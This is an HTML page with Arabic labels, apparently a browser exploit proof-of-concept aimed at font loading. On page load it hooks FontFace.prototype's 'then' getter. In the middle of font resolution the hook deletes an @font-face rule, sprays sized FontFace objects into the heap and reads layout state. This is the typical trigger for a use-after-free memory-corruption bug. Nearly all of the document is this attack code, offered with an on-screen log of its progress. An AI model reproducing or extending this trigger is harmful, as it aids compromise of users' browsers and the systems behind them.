<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>فحص المسار الصافي - تفكيك الجمود</title>
    <style>
        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
        .log { margin-bottom: 8px; }
        .warn { color: #ffaa00; }
        .success { color: #00ff00; font-weight: bold; }
    </style>
    
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>

    <h2>مراقبة مسار معالجة الخطوط الصافي (Minimal Target Loop)</h2>
    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المستند...</div>

    <script>
        const consoleElement = document.getElementById('custom-console');
        function screenLog(msg, type = "normal") {
            const entry = document.createElement('div');
            if (type === "warn") entry.className = 'log warn';
            else if (type === "success") entry.className = 'log success';
            else entry.className = 'log';
            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            consoleElement.appendChild(entry);
            consoleElement.scrollTop = consoleElement.scrollHeight;
        }

        var control_storage = [];

        function runMinimalAnalysis() {
            consoleElement.innerHTML = "";
            screenLog("بدء تشغيل الفحص النظيف (بدون حشو مسبق)...");

            try {
                // إعداد الكائن المستهدف مباشرة لضمان سلامة الـ Heap البدئي
                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
                document.fonts.add(A);
                void A.loaded;

                let fired = false;

                // كمين المقاطعة المنطقية المستقر
                Object.defineProperty(FontFace.prototype, 'then', {
                    configurable: true,
                    get() {
                        if (!fired && this === A) {
                            fired = true;
                            screenLog("!! تم رصد وتفعيل المقاطعة بنجاح !!", "warn");
                            
                            try {
                                // تدمير القاعدة التنسيقية لتوليد الفجوة الهيكلية
                                document.getElementById('s').sheet.deleteRule(0);
                                screenLog("تم حذف القاعدة التنسيقية بنجاح.");
                            } catch(e) { screenLog("خطأ الحذف: " + e.message, "warn"); }
                            
                            // تخصيص عنصرين فقط كعينة فحص نوعية بحجم متوافق (0xb8) لمنع الـ OOM والجمود
                            screenLog("حقن عينة فحص مصغرة جداً في الـ Heap...");
                            control_storage.push(new FontFace("target1", "", {}));
                            control_storage.push(new FontFace("target2", "", {}));
                            
                            // إغلاق الدالة وتمرير التنفيذ فوراً دون تأخير
                            setTimeout(() => {
                                screenLog("محاولة قراءة الـ Offset بعد خروج المكدس...");
                                let offset = document.body.offsetTop;
                                screenLog("قيمة الـ Offset المسترجعة: " + offset);
                            }, 30);
                        }
                        return function(resolve) { if (resolve) resolve(); };
                    }
                });

                screenLog("إطلاق طلب المعالجة المباشر عبر الـ Layout Pipeline...");
                document.fonts.load('1em x', 'AB');

            } catch (err) {
                screenLog("خطأ عام: " + err.message, "warn");
            }
        }

        window.onload = () => {
            screenLog("تم تحميل الصفحة تماماً. الانتظار 1.5 ثانية للاستقرار...");
            setTimeout(runMinimalAnalysis, 1500);
        };
    </script>
</body>
</html>
